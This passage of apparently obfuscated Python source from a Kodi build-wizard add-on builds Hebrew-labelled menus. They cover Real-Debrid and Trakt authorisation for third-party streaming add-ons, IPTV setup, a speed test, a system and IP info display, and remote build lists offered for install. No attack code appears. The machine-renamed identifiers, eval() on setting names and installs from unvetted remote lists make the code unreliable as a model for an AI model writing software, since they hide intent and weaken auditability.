	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2423
def morsetup ():#line:2425
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2426
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2427
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2428
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2429
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2430
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2434
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2435
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2438
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2439
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2440
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2441
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2451
	setView ('files','viewType')#line:2452
def morsetup2 ():#line:2453
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2454
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2455
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2456
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2457
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2458
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2459
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2460
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2461
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2462
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2463
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2464
def fastupdate ():#line:2465
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2466
def forcefastupdate ():#line:2468
			OOO00OO0O0OO0O00O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2469
			wiz .ForceFastUpDate (ADDONTITLE ,OOO00OO0O0OO0O00O )#line:2470
def rdsetup ():#line:2474
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2475
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2476
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2478
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2479
def traktsetup ():#line:2482
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2483
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2484
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2485
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2486
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2487
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2488
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2489
	setView ('files','viewType')#line:2490
def setautorealdebrid ():#line:2491
    from resources .libs import real_debrid #line:2492
    O0OO000O0OO00O0O0 =real_debrid .RealDebridFirst ()#line:2493
    O0OO000O0OO00O0O0 .auth ()#line:2494
def setrealdebrid ():#line:2496
    OO00O000OO0OOOO00 =(ADDON .getSetting ("auto_rd"))#line:2497
    if OO00O000OO0OOOO00 =='false':#line:2498
       ADDON .openSettings ()#line:2499
    else :#line:2500
        from resources .libs import real_debrid #line:2501
        OO00O0O0O0OO00O0O =real_debrid .RealDebrid ()#line:2502
        OO00O0O0O0OO00O0O .auth ()#line:2503
        rdon ()#line:2506
def resolveurlsetup ():#line:2508
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2509
def urlresolversetup ():#line:2510
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2511
def placentasetup ():#line:2513
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2514
def reptiliasetup ():#line:2515
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2516
def flixnetsetup ():#line:2517
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2518
def yodasetup ():#line:2519
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2520
def numberssetup ():#line:2521
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2522
def uranussetup ():#line:2523
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2524
def genesissetup ():#line:2525
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2526
def net_tools (view =None ):#line:2528
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2529
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2530
	setView ('files','viewType')#line:2532
def speedMenu ():#line:2533
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2534
def viewIP ():#line:2535
	O00OOO00O0O0OO0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2549
	O0O0OO00OOOOO0O00 =[];OO0OOOOOOO00OOOOO =0 #line:2550
	for OO00O0OOO0000OO00 in O00OOO00O0O0OO0O0 :#line:2551
		O0O0O00OO0OOOO00O =wiz .getInfo (OO00O0OOO0000OO00 )#line:2552
		O0O0OOOO00OO00OOO =0 #line:2553
		while O0O0O00OO0OOOO00O =="Busy"and O0O0OOOO00OO00OOO <10 :#line:2554
			O0O0O00OO0OOOO00O =wiz .getInfo (OO00O0OOO0000OO00 );O0O0OOOO00OO00OOO +=1 ;wiz .log ("%s sleep %s"%(OO00O0OOO0000OO00 ,str (O0O0OOOO00OO00OOO )));xbmc .sleep (1000 )#line:2555
		O0O0OO00OOOOO0O00 .append (O0O0O00OO0OOOO00O )#line:2556
		OO0OOOOOOO00OOOOO +=1 #line:2557
	O00O0O0OOO0O0OO00 ,O0000O0O0000O0000 ,O00O00O0OO00O0O00 =getIP ()#line:2558
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO00OOOOO0O00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2559
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0OOO0O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2560
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0O0000O0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2561
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00O0OO00O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2562
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO00OOOOO0O00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2563
	setView ('files','viewType')#line:2564
def buildMenu ():#line:2566
	if USERNAME =='':#line:2567
		ADDON .openSettings ()#line:2568
		sys .exit ()#line:2569
	if PASSWORD =='':#line:2570
		ADDON .openSettings ()#line:2571
	O00OO0000O0000OO0 =u_list (SPEEDFILE )#line:2572
	(O00OO0000O0000OO0 )#line:2573
	O0OO0OO0O0O0O000O =(wiz .workingURL (O00OO0000O0000OO0 ))#line:2574
	(O0OO0OO0O0O0O000O )#line:2575
	O0OO0OO0O0O0O000O =wiz .workingURL (SPEEDFILE )#line:2576
	if not O0OO0OO0O0O0O000O ==True :#line:2577
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2578
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2579
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2580
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2581
		addFile ('%s'%O0OO0OO0O0O0O000O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2582
	else :#line:2583
		OOOO0OOOO0OO00000 ,OOOO00OOOOOOO00O0 ,O00000OOO0O0O00O0 ,O000OO0OOO0OOOOOO ,OOOO00OO000OOO00O ,O0OOO0OO0O00OO0O0 ,O0O0000OOO0OO0000 =wiz .buildCount ()#line:2584
		O0O0OOOO000000OO0 =False ;O0OO0OOOOOOO0000O =[]#line:2585
		if THIRDPARTY =='true':#line:2586
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0OOOO000000OO0 =True ;O0OO0OOOOOOO0000O .append ('1')#line:2587
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0OOOO000000OO0 =True ;O0OO0OOOOOOO0000O .append ('2')#line:2588
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0OOOO000000OO0 =True ;O0OO0OOOOOOO0000O .append ('3')#line:2589
		OO0OO0OOOOO0OOO00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2590
		O0OO0O0OO0OO0OOOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OO0OOOOO0OOO00 )#line:2591
		if OOOO0OOOO0OO00000 ==1 and O0O0OOOO000000OO0 ==False :#line:2592
			for O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ,OO0OO00O0O0O0OO00 ,O00OOOOOOOOO00000 ,O0OO0OO00O00000O0 ,OO0OO0O00OO0OO000 ,OOOOO0OOOOO0OOOOO ,O00OOO0O000OO0OO0 ,O0O00OO000OO0OOOO ,OO000000OOOOO0O0O in O0OO0O0OO0OO0OOOO :#line:2593
				if not SHOWADULT =='true'and O0O00OO000OO0OOOO .lower ()=='yes':continue #line:2594
				if not DEVELOPER =='true'and wiz .strTest (O0000OOO0OO0000O0 ):continue #line:2595
				viewBuild (O0OO0O0OO0OO0OOOO [0 ][0 ])#line:2596
				return #line:2597
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2600
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2601
		if O0O0OOOO000000OO0 ==True :#line:2602
			for O00O0000OOO0O00OO in O0OO0OOOOOOO0000O :#line:2603
				O0000OOO0OO0000O0 =eval ('THIRD%sNAME'%O00O0000OOO0O00OO )#line:2604
		if len (O0OO0O0OO0OO0OOOO )>=1 :#line:2606
			if SEPERATE =='true':#line:2607
				for O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ,OO0OO00O0O0O0OO00 ,O00OOOOOOOOO00000 ,O0OO0OO00O00000O0 ,OO0OO0O00OO0OO000 ,OOOOO0OOOOO0OOOOO ,O00OOO0O000OO0OO0 ,O0O00OO000OO0OOOO ,OO000000OOOOO0O0O in O0OO0O0OO0OO0OOOO :#line:2608
					if not SHOWADULT =='true'and O0O00OO000OO0OOOO .lower ()=='yes':continue #line:2609
					if not DEVELOPER =='true'and wiz .strTest (O0000OOO0OO0000O0 ):continue #line:2610
					O0OO00O0OO0O0OOO0 =createMenu ('install','',O0000OOO0OO0000O0 )#line:2611
					addDir ('[%s] %s (v%s)'%(float (O0OO0OO00O00000O0 ),O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ),'viewbuild',O0000OOO0OO0000O0 ,description =OO000000OOOOO0O0O ,fanart =O00OOO0O000OO0OO0 ,icon =OOOOO0OOOOO0OOOOO ,menu =O0OO00O0OO0O0OOO0 ,themeit =THEME2 )#line:2612
			else :#line:2613
				if O000OO0OOO0OOOOOO >0 :#line:2614
					O00O000000OOO0000 ='+'if SHOW17 =='false'else '-'#line:2615
					if SHOW17 =='true':#line:2617
						for O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ,OO0OO00O0O0O0OO00 ,O00OOOOOOOOO00000 ,O0OO0OO00O00000O0 ,OO0OO0O00OO0OO000 ,OOOOO0OOOOO0OOOOO ,O00OOO0O000OO0OO0 ,O0O00OO000OO0OOOO ,OO000000OOOOO0O0O in O0OO0O0OO0OO0OOOO :#line:2619
							if not SHOWADULT =='true'and O0O00OO000OO0OOOO .lower ()=='yes':continue #line:2620
							if not DEVELOPER =='true'and wiz .strTest (O0000OOO0OO0000O0 ):continue #line:2621
							OO0OO0OO0O0O0OOO0 =int (float (O0OO0OO00O00000O0 ))#line:2622
							if OO0OO0OO0O0O0OOO0 ==17 :#line:2623
								O0OO00O0OO0O0OOO0 =createMenu ('install','',O0000OOO0OO0000O0 )#line:2624
								addDir ('[%s] %s (v%s)'%(float (O0OO0OO00O00000O0 ),O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ),'viewbuild',O0000OOO0OO0000O0 ,description =OO000000OOOOO0O0O ,fanart =O00OOO0O000OO0OO0 ,icon =OOOOO0OOOOO0OOOOO ,menu =O0OO00O0OO0O0OOO0 ,themeit =THEME2 )#line:2625
				if OOOO00OO000OOO00O >0 :#line:2626
					O00O000000OOO0000 ='+'if SHOW18 =='false'else '-'#line:2627
					if SHOW18 =='true':#line:2629
						for O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ,OO0OO00O0O0O0OO00 ,O00OOOOOOOOO00000 ,O0OO0OO00O00000O0 ,OO0OO0O00OO0OO000 ,OOOOO0OOOOO0OOOOO ,O00OOO0O000OO0OO0 ,O0O00OO000OO0OOOO ,OO000000OOOOO0O0O in O0OO0O0OO0OO0OOOO :#line:2631
							if not SHOWADULT =='true'and O0O00OO000OO0OOOO .lower ()=='yes':continue #line:2632
							if not DEVELOPER =='true'and wiz .strTest (O0000OOO0OO0000O0 ):continue #line:2633
							OO0OO0OO0O0O0OOO0 =int (float (O0OO0OO00O00000O0 ))#line:2634
							if OO0OO0OO0O0O0OOO0 ==18 :#line:2635
								O0OO00O0OO0O0OOO0 =createMenu ('install','',O0000OOO0OO0000O0 )#line:2636
								addDir ('[%s] %s (v%s)'%(float (O0OO0OO00O00000O0 ),O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ),'viewbuild',O0000OOO0OO0000O0 ,description =OO000000OOOOO0O0O ,fanart =O00OOO0O000OO0OO0 ,icon =OOOOO0OOOOO0OOOOO ,menu =O0OO00O0OO0O0OOO0 ,themeit =THEME2 )#line:2637
				if O00000OOO0O0O00O0 >0 :#line:2638
					O00O000000OOO0000 ='+'if SHOW16 =='false'else '-'#line:2639
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O00O000000OOO0000 ,O00000OOO0O0O00O0 ),'togglesetting','show16',themeit =THEME3 )#line:2640
					if SHOW16 =='true':#line:2641
						for O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ,OO0OO00O0O0O0OO00 ,O00OOOOOOOOO00000 ,O0OO0OO00O00000O0 ,OO0OO0O00OO0OO000 ,OOOOO0OOOOO0OOOOO ,O00OOO0O000OO0OO0 ,O0O00OO000OO0OOOO ,OO000000OOOOO0O0O in O0OO0O0OO0OO0OOOO :#line:2642
							if not SHOWADULT =='true'and O0O00OO000OO0OOOO .lower ()=='yes':continue #line:2643
							if not DEVELOPER =='true'and wiz .strTest (O0000OOO0OO0000O0 ):continue #line:2644
							OO0OO0OO0O0O0OOO0 =int (float (O0OO0OO00O00000O0 ))#line:2645
							if OO0OO0OO0O0O0OOO0 ==16 :#line:2646
								O0OO00O0OO0O0OOO0 =createMenu ('install','',O0000OOO0OO0000O0 )#line:2647
								addDir ('[%s] %s (v%s)'%(float (O0OO0OO00O00000O0 ),O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ),'viewbuild',O0000OOO0OO0000O0 ,description =OO000000OOOOO0O0O ,fanart =O00OOO0O000OO0OO0 ,icon =OOOOO0OOOOO0OOOOO ,menu =O0OO00O0OO0O0OOO0 ,themeit =THEME2 )#line:2648
				if OOOO00OOOOOOO00O0 >0 :#line:2649
					O00O000000OOO0000 ='+'if SHOW15 =='false'else '-'#line:2650
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O00O000000OOO0000 ,OOOO00OOOOOOO00O0 ),'togglesetting','show15',themeit =THEME3 )#line:2651
					if SHOW15 =='true':#line:2652
						for O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ,OO0OO00O0O0O0OO00 ,O00OOOOOOOOO00000 ,O0OO0OO00O00000O0 ,OO0OO0O00OO0OO000 ,OOOOO0OOOOO0OOOOO ,O00OOO0O000OO0OO0 ,O0O00OO000OO0OOOO ,OO000000OOOOO0O0O in O0OO0O0OO0OO0OOOO :#line:2653
							if not SHOWADULT =='true'and O0O00OO000OO0OOOO .lower ()=='yes':continue #line:2654
							if not DEVELOPER =='true'and wiz .strTest (O0000OOO0OO0000O0 ):continue #line:2655
							OO0OO0OO0O0O0OOO0 =int (float (O0OO0OO00O00000O0 ))#line:2656
							if OO0OO0OO0O0O0OOO0 <=15 :#line:2657
								O0OO00O0OO0O0OOO0 =createMenu ('install','',O0000OOO0OO0000O0 )#line:2658
								addDir ('[%s] %s (v%s)'%(float (O0OO0OO00O00000O0 ),O0000OOO0OO0000O0 ,O0OO0O00OO00O00OO ),'viewbuild',O0000OOO0OO0000O0 ,description =OO000000OOOOO0O0O ,fanart =O00OOO0O000OO0OO0 ,icon =OOOOO0OOOOO0OOOOO ,menu =O0OO00O0OO0O0OOO0 ,themeit =THEME2 )#line:2659
		elif O0O0000OOO0OO0000 >0 :#line:2660
			if O0OOO0OO0O00OO0O0 >0 :#line:2661
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2662
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2663
			else :#line:2664
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2665
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2666
	setView ('files','viewType')#line:2667
def viewBuild (OO000OOOO00OO000O ):#line:2669
	O000OOOO0OOO00OO0 =wiz .workingURL (SPEEDFILE )#line:2670
	if not O000OOOO0OOO00OO0 ==True :#line:2671
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2672
		addFile ('%s'%O000OOOO0OOO00OO0 ,'',themeit =THEME3 )#line:2673
		return #line:2674
	if wiz .checkBuild (OO000OOOO00OO000O ,'version')==False :#line:2675
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2676
		addFile ('%s was not found in the builds list.'%OO000OOOO00OO000O ,'',themeit =THEME3 )#line:2677
		return #line:2678
	O0000OOO00OO00O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2679
	OO0000O000O0OO0O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO000OOOO00OO000O ).findall (O0000OOO00OO00O0O )#line:2680
	for OO0O0OO00000OOOOO ,O0O00OOOOO0OO000O ,OOOOO0000OO0OOO00 ,O0OOO00O00OOO00O0 ,OOOO00O00O0OOOOOO ,OOO0O0OO0OO0O000O ,O00OO0OOO0OOO0000 ,OO000OOOOO00OO0OO ,OO000O000OO00O0OO ,O000O0O00O0O0OOO0 in OO0000O000O0OO0O0 :#line:2681
		OOO0O0OO0OO0O000O =OOO0O0OO0OO0O000O if wiz .workingURL (OOO0O0OO0OO0O000O )else ICON #line:2682
		O00OO0OOO0OOO0000 =O00OO0OOO0OOO0000 if wiz .workingURL (O00OO0OOO0OOO0000 )else FANART #line:2683
		OOOOOOOOOO0O0OO0O ='%s (v%s)'%(OO000OOOO00OO000O ,OO0O0OO00000OOOOO )#line:2684
		if BUILDNAME ==OO000OOOO00OO000O and OO0O0OO00000OOOOO >BUILDVERSION :#line:2685
			OOOOOOOOOO0O0OO0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOOOOOOOOO0O0OO0O ,BUILDVERSION )#line:2686
		O0000O00OOOOOO0O0 =int (float (KODIV ));OOOOOO0OOO0000O00 =int (float (O0OOO00O00OOO00O0 ))#line:2695
		if not O0000O00OOOOOO0O0 ==OOOOOO0OOO0000O00 :#line:2696
			if O0000O00OOOOOO0O0 ==16 and OOOOOO0OOO0000O00 <=15 :OOO0OO000O00000O0 =False #line:2697
			else :OOO0OO000O00000O0 =True #line:2698
		else :OOO0OO000O00000O0 =False #line:2699
		addFile ('התקנה','install',OO000OOOO00OO000O ,'fresh',description =O000O0O00O0O0OOO0 ,fanart =O00OO0OOO0OOO0000 ,icon =OOO0O0OO0OO0O000O ,themeit =THEME1 )#line:2703
		if not OOOO00O00O0OOOOOO =='http://':#line:2706
			if wiz .workingURL (OOOO00O00O0OOOOOO )==True :#line:2707
				addFile (wiz .sep ('THEMES'),'',fanart =O00OO0OOO0OOO0000 ,icon =OOO0O0OO0OO0O000O ,themeit =THEME3 )#line:2708
				O0000OOO00OO00O0O =wiz .openURL (OOOO00O00O0OOOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2709
				OO0000O000O0OO0O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OOO00OO00O0O )#line:2710
				for OOOOOO00O0O0O0OO0 ,OOOO0O0000O0OO0O0 ,OO00O0O00O0O0O0O0 ,OO0000O0OOOOOOO0O ,O0OOOO0OOOOO0OO00 ,O000O0O00O0O0OOO0 in OO0000O000O0OO0O0 :#line:2711
					if not SHOWADULT =='true'and O0OOOO0OOOOO0OO00 .lower ()=='yes':continue #line:2712
					OO00O0O00O0O0O0O0 =OO00O0O00O0O0O0O0 if OO00O0O00O0O0O0O0 =='http://'else OOO0O0OO0OO0O000O #line:2713
					OO0000O0OOOOOOO0O =OO0000O0OOOOOOO0O if OO0000O0OOOOOOO0O =='http://'else O00OO0OOO0OOO0000 #line:2714
					addFile (OOOOOO00O0O0O0OO0 if not OOOOOO00O0O0O0OO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOOOO00O0O0O0OO0 ,'theme',OO000OOOO00OO000O ,OOOOOO00O0O0O0OO0 ,description =O000O0O00O0O0OOO0 ,fanart =OO0000O0OOOOOOO0O ,icon =OO00O0O00O0O0O0O0 ,themeit =THEME3 )#line:2715
	setView ('files','viewType')#line:2716
def viewThirdList (O000O00000OO0O0O0 ):#line:2718
	OO0O0000O000OO0O0 =eval ('THIRD%sNAME'%O000O00000OO0O0O0 )#line:2719
	O0000000OO000000O =eval ('THIRD%sURL'%O000O00000OO0O0O0 )#line:2720
	O000O0O0O00OOO0O0 =wiz .workingURL (O0000000OO000000O )#line:2721
	if not O000O0O0O00OOO0O0 ==True :#line:2722
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2723
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2724
	else :#line:2725
		OOOO00000OOOOO0O0 ,OOO00OO000OOOOOOO =wiz .thirdParty (O0000000OO000000O )#line:2726
		addFile ("[B]%s[/B]"%OO0O0000O000OO0O0 ,'',themeit =THEME3 )#line:2727
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2728
		if OOOO00000OOOOO0O0 :#line:2729
			for OO0O0000O000OO0O0 ,O0OO0OOO0O0OO000O ,O0000000OO000000O ,O0OO0O0OOO0OOOO0O ,O0O0OOOO0OOO0O0O0 ,OOOOOOO0O0OOO000O ,OOO0O000O0OOO0000 ,OO0O0OOO0O000O00O in OOO00OO000OOOOOOO :#line:2730
				if not SHOWADULT =='true'and OOO0O000O0OOO0000 .lower ()=='yes':continue #line:2731
				addFile ("[%s] %s v%s"%(O0OO0O0OOO0OOOO0O ,OO0O0000O000OO0O0 ,O0OO0OOO0O0OO000O ),'installthird',OO0O0000O000OO0O0 ,O0000000OO000000O ,icon =O0O0OOOO0OOO0O0O0 ,fanart =OOOOOOO0O0OOO000O ,description =OO0O0OOO0O000O00O ,themeit =THEME2 )#line:2732
		else :#line:2733
			for OO0O0000O000OO0O0 ,O0000000OO000000O ,O0O0OOOO0OOO0O0O0 ,OOOOOOO0O0OOO000O ,OO0O0OOO0O000O00O in OOO00OO000OOOOOOO :#line:2734
				addFile (OO0O0000O000OO0O0 ,'installthird',OO0O0000O000OO0O0 ,O0000000OO000000O ,icon =O0O0OOOO0OOO0O0O0 ,fanart =OOOOOOO0O0OOO000O ,description =OO0O0OOO0O000O00O ,themeit =THEME2 )#line:2735
def editThirdParty (OO0OO00O0000OO000 ):#line:2737
	O0O000OO00O000OO0 =eval ('THIRD%sNAME'%OO0OO00O0000OO000 )#line:2738
	O0O00OOOO0OOO0O00 =eval ('THIRD%sURL'%OO0OO00O0000OO000 )#line:2739
	O0O0OOO0OO0OOOOOO =wiz .getKeyboard (O0O000OO00O000OO0 ,'Enter the Name of the Wizard')#line:2740
	OO00000OOO0OOOO0O =wiz .getKeyboard (O0O00OOOO0OOO0O00 ,'Enter the URL of the Wizard Text')#line:2741
	wiz .setS ('wizard%sname'%OO0OO00O0000OO000 ,O0O0OOO0OO0OOOOOO )#line:2743
	wiz .setS ('wizard%surl'%OO0OO00O0000OO000 ,OO00000OOO0OOOO0O )#line:2744
def apkScraper (name =""):#line:2746
	if name =='kodi':#line:2747
		OOOOOOOOO0O0OO0OO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2748
		O0OOO00000OOO00O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2749
		OO0O00O0O0O000O0O =wiz .openURL (OOOOOOOOO0O0OO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2750
		OOOO0O0000OOO00OO =wiz .openURL (O0OOO00000OOO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2751
		OO0OO000O0O000O0O =0 #line:2752
		OO00OOOOO00000OOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O00O0O0O000O0O )#line:2753
		OO0O00OO00O00000O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOO0O0000OOO00OO )#line:2754
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2756
		OOOO00OO000O00OO0 =False #line:2757
		for O0OO00000000000O0 ,name ,OO0OO000OO0O00O00 ,OOOOO0OOOOO000O0O in OO00OOOOO00000OOO :#line:2758
			if O0OO00000000000O0 in ['../','old/']:continue #line:2759
			if not O0OO00000000000O0 .endswith ('.apk'):continue #line:2760
			if not O0OO00000000000O0 .find ('_')==-1 and OOOO00OO000O00OO0 ==True :continue #line:2761
			try :#line:2762
				OO00OO0O000O0OO0O =name .split ('-')#line:2763
				if not O0OO00000000000O0 .find ('_')==-1 :#line:2764
					OOOO00OO000O00OO0 =True #line:2765
